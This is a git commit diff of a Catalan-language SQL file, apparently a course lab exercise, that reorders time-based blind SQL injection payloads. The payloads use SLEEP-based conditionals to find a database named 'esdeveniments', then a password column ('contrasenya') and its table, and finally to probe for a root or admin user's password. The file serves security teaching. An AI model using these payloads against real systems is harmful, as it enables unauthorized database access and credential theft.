5fb93f11e1592b3f701c7ce00af9bdd99fc9f6a1
Eric G. <ergare.17@gmail.com>
2025-02-21 11:12:19 +0100

    Update UF3_3_6.sql

--- UF3_3_6.sql
+++ UF3_3_6.sql
@@ -5,18 +5,18 @@
 -- -> trobar la base de dades on es guarda la informació sensible
 -- -> consultar la informació sensible
 
--- #1 Buscar directament la columna que guarda la 'contrasenya'
-IF(EXISTS(SELECT * FROM information_schema.columns WHERE column_name LIKE 'contrasenya'), SLEEP(1), SLEEP(0)); -- -
-
--- #2 Buscar directament el nom de la taula que guarda la 'contrasenya'
-IF(EXISTS(SELECT * FROM information_schema.columns WHERE column_name LIKE 'contrasenya' AND table_name LIKE '%o%'), SLEEP(1), SLEEP(0)); -- -
-
-IF(EXISTS(SELECT * FROM information_schema.columns WHERE column_name LIKE 'contrasenya' AND table_name LIKE '%e%o%' AND LENGTH(table_name) < 100), SLEEP(1), SLEEP(0)); -- -
-
-IF(EXISTS(SELECT * FROM information_schema.columns WHERE column_name LIKE 'contrasenya' AND table_name LIKE 'treballadors' AND LENGTH(table_name) < 100), SLEEP(1), SLEEP(0)); -- -
-
--- #3 Trobar el nom de la base de dades
+-- #1 Trobar el nom de la base de dades
 IF(database() LIKE 'esdeveniments', SLEEP(1), SLEEP(0)); -- -
+
+-- #2 Buscar la columna que guarda la 'contrasenya' a la base de dades actual
+IF(EXISTS(SELECT * FROM information_schema.columns WHERE table_schema = 'esdeveniments' AND column_name LIKE 'contrasenya'), SLEEP(1), SLEEP(0)); -- -
+
+-- #3 Buscar el nom de la taula que guarda la 'contrasenya' a la base de dades actual
+IF(EXISTS(SELECT * FROM information_schema.columns WHERE table_schema = 'esdeveniments' AND column_name LIKE 'contrasenya' AND table_name LIKE '%o%'), SLEEP(1), SLEEP(0)); -- -
+
+IF(EXISTS(SELECT * FROM information_schema.columns WHERE table_schema = 'esdeveniments' AND column_name LIKE 'contrasenya' AND table_name LIKE '%e%o%' AND LENGTH(table_name) < 100), SLEEP(1), SLEEP(0)); -- -
+
+IF(EXISTS(SELECT * FROM information_schema.columns WHERE table_schema = 'esdeveniments' AND column_name LIKE 'contrasenya' AND table_name LIKE 'treballadors' AND LENGTH(table_name) < 100), SLEEP(1), SLEEP(0)); -- -
 
 -- #4 Buscar si hi ha algun usuari 'root' o 'admin'
 IF(EXISTS(SELECT * FROM esdeveniments.treballadors WHERE nom LIKE '%root%' AND contrasenya LIKE 'xx.okay.xx'), SLEEP(1), SLEEP(0)); -- -
